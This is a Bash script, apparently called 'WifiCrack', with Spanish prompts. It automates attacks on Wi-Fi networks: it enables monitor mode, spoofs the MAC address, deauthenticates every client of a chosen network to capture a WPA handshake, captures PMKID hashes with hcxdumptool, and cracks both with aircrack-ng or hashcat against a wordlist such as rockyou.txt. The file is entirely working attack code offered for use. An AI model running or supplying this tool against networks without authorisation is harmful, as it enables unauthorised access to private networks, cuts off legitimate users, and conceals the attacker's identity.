#!/bin/bash

# Modulo de colores 
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
cleancolor="echo -e "${endColour}""

if [ $(id -u) -ne 0 ]; then
	echo -e "$redColour\n[!] Debes ser root para ejecutar la herramienta -> (sudo $0)"
exit 1
fi

test -f /usr/bin/aircrack-ng
airtest=$(echo $?)

test -f /usr/bin/xterm
xtermtest=$(echo $?)

test -f /usr/bin/macchanger
macctest=$(echo $?)

if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
	clear
	# Banner
	echo -e "${turquoiseColour}"
	echo " ( ( ( /\ ) ) )  "
	echo "      /\/\      "  
	echo "     /\/\/\      " 
	echo "    /)/\/\(\   "
	echo "   /\/\/\/\/\ "
	echo "  / O O O O  \ "
	echo "WifiCrack ByKidd3n"
	echo "/\/\/\/\/\/\/\/\ "
	echo -e "${purpleColour}"
	echo "[+] Github: https://github.com/kidd3n"
	read -p "[+] Enter para continuar"
		$cleancolor
		iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
			echo -e "${blueColour}"
			read -p "[?] Que tarjeta deseas usar: " tar
				$cleancolor
				echo -e "\n${redColour}[*] Se esta iniciando el modo monitor y cambiando tu dirrecion MAC en $tar\n"
				airmon-ng start $tar > /dev/null 2>&1
				ifconfig ${tar}mon down && macchanger -a ${tar}mon > /dev/null 2>&1
				ifconfig ${tar}mon up
				airmon-ng check kill > /dev/null 2>&1
				echo -e "\n${yellowColour}[*] Nueva direccion MAC asignada: $(macchanger -s ${tar}mon | grep -i current | xargs | cut -d ' ' -f '3-100')"
				echo -e "\n${greenColour}[*] Ya tienes tu tarjeta preparada!\n"
				read -p "[?] Quieres hacer un ataque? [Y/N]: " rps
					$cleancolor
					if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
						while true; do
							clear
							echo -e "${grayColour}\n[+] Menu de ataques\n${endColour}"
							echo -e "${redColour}"
							echo -e "   #"
							echo -e "    #	                             ( ( \ )  ( / ) )"
							echo -e "    ###=====================\      	  \----/"
							echo -e "    ###==WifiCrack by kidd3n ----->  	  |    |"
							echo -e "    ###=====================/             +----+"
							echo -e "    #"
							echo -e "   #"
							sleep 1
							echo -e "${blueColour}\n[+] Targeta de Red: ${tar}mon" 
							echo -e "${blueColour}[+] Direccion MAC: $(macchanger --show ${tar}mon | grep "Current MAC" | awk '{print $3}')"
							echo -e "${yellowColour}\n1) Ataque Handshake"
							echo -e "2) Ataque PKMID"
							echo -e "3) Ataque de fuerza bruta"
							echo -e "4) Salir"
							echo -e "${greenColour}"; read -p "Seleccione un ataque: " opcion
							$cleancolor
							case $opcion in
								1)
								echo -e "\n${turquoiseColour}[*] Iniciando Ataque Handshake"
								sleep 1
								xterm -hold -e "airodump-ng ${tar}mon" &
								airodump_xterm_PID=$!
								echo -e "$grayColour"
								read -p "[?] Que red deseas atacar?: " ap
								read -p "[?] En que canal esta ${ap}?: " channel
								$cleancolor
								echo -e "${greenColour}[*] Se esta desautenticando a los usuarios de la red"
								$cleancolor
								kill -9 $airodump_xterm_PID
								wait $airodump_xterm_PID 2>/dev/null

								xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
								airodump_filter_xterm_PID=$!

								sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &								
								aireplay_xterm_PID=$!
								sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

								echo -e "${redColour}\n[%] Esperando Handshake\n"
								$cleancolor
								
								sleep 10; kill -9 $airodump_filter_xterm_PID
								wait $airodump_filter_xterm_PID 2>/dev/null
								test -f Handshake-01.cap
								if [ "$(echo $?)" == "0" ]; then
									echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
									read -p "[?] Ruta del Diccionario al usar: " dicc
									$cleancolor
									xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"

									echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
									airmon-ng stop ${tar}mon > /dev/null 2>&1
									sudo /etc/init.d/networking start > /dev/null 2>&1
									sudo /etc/init.d/networking restart > /dev/null 2>&1
									ifconfig $tar up > /dev/null 2>&1
									sudo rm Handshake* > /dev/null 2>&1
									exit
								else 
									echo -e "${redColour}\n [!] No se ha capturado el Handshake"
								fi
								;;
								2)
								echo -e "\n${greenColour}[*] Iniciando ataque PKMID..\n"
								sleep 1 
								timeout 60 bash -c "hcxdumptool -i ${tar}mon --enable_status=1 -o Hash" &
								echo -e "\n${redColour} [%] Capturando Hashes\n"
								sleep 2
								hcxcaptool -z Hashes Hash; rm Hash 2>/dev/null
								test -f  Hashes
								if [ "$(echo $?)" == "0" ]; then
									echo -e "\n${yellowColour}[*] Iniciando ataque de fuerza bruta"
									sleep 1
									echo -e "\n${blueColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
									read -p "[?] Ruta del Diccionario al usar: " dicc1
									hashcat -m 16800 $dicc1 Hashes -d 1 --force 
								else 
									echo -e "\n${redColour}[!] No se pudo capturar el paquete necesario"
									exit
								fi
								;;
								3)
								echo -e "\n${greenColour}[*] Iniciando Ataque de Fuerza Bruta"
								sleep 1
								echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
									$cleancolor
									read -p "[?] Nombre del archivo .cap: " cap
									read -p "[?] Ruta del Diccionario al usar: " dicc
									xterm -hold -e "aircrack-ng -w $dicc $cap"
								;;
								4)
								echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
								airmon-ng stop ${tar}mon > /dev/null 2>&1
								sudo /etc/init.d/networking start > /dev/null 2>&1
								sudo /etc/init.d/networking restart > /dev/null 2>&1
								ifconfig $tar up > /dev/null 2>&1
								sudo rm Handshake* > /dev/null 2>&1
								exit
								;;
								*)
								echo "Opción inválida"
								;;
							esac
							done
					fi
				if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
					echo -e "${redColour}\n[!] Saliendo"
					$cleancolor
					exit
				fi
else
	clear
	echo -e "\n${purpleColour}[!] Se necesitan instalar dependencias\n"
	sleep 1
	read -p "[?] Cual Distribucion estas usando? [1)Debian  2)Arch]: " distro
		if [ $distro == "1" ]; then	
			echo -e "${greenColour}\n[*] Actualizando Repositorios y descargando las dependencias..."
				sudo apt-get update -y > /dev/null 2>&1
				sudo apt-get install hcxtool -y > /dev/null 2>&1
				sudo apt-get install xterm -y > /dev/null 2>&1
				sudo apt-get install macchanger -y > /dev/null 2>&1
				sudo apt-get install aircrack-ng -y > /dev/null 2>&1
				sudo apt-get install hashcat -y > /dev/null 2>&1
				sudo ./WifiCrack.sh

		fi

		if [ $distro == "2" ]; then
			echo -e ${greenColour}"\n[*] Actualizando Repositorios..."
			sudo pacman -Sy -y > /dev/null 2>&1
			echo -e "${grayColour}\n[*] Instalando o actualizando hcxtool...${endColour}"
				sudo pacman -S hcxtools -y > /dev/null 2>&1
			echo -e "${grayColour}\n[*] Instalando o actualizando macchanger...${endColour}"
				sudo pacman -S macchanger -y > /dev/null 2>&1
			echo -e "${grayColour}\n[*] Instalando o actualizando xterm...${endColour}"
				sudo pacman -S xterm -y > /dev/null 2>&1
			echo -e "${grayColour}\n[*] Instalando o actualizando aircrack-ng...${endColour}"
				sudo pacman -S aircrack-ng -y > /dev/null 2>&1
				sudo ./WifiCrack.sh
		fi
fi